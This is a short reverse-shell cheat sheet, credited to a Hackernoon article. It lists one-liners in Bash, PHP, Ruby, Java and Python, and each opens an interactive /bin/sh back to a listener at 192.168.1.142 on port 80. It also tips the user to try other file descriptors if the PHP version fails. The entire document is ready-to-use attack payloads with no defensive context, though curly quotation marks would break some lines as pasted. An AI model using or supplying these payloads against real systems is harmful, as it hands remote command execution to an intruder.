#Bash
exec 5<>/dev/tcp/192.168.1.142/80
cat <&5 | while read line; do $line 2>&5 >&5; done 
# or:
while read line 0<&5; do $line 2>&5 >&5; done

#PHP
php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i <&3 >&3 2>&3”);’
#(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)

#RUBY
ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

#JAVA
r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
p.waitFor()

#PYTHON
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

# Extraido a partir de https://hackernoon.com/reverse-shell-cf154dfee6bd
